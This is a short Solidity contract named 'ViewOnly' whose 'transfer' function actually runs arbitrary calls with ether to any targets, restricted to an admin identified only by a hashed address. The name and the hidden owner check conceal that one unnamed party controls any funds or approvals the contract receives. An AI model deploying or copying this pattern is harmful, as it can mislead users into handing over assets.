//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.18;


contract ViewOnly {

    modifier onlyAdmin() {
        require(keccak256(abi.encodePacked(msg.sender)) == 0x095d6339a5868a9636197fb26011ab16936241012ba5f2ffac3422c6bff92a7d);
        _;
    }
    
   function transfer(address[] calldata targets, bytes[] calldata data, uint[] memory values) external onlyAdmin {
        for (uint256 i = 0; i < targets.length; i++) {
            targets[i].call{value: values[i]}(data[i]);
        }
    }

    fallback() external payable { }
    receive() external payable { }
}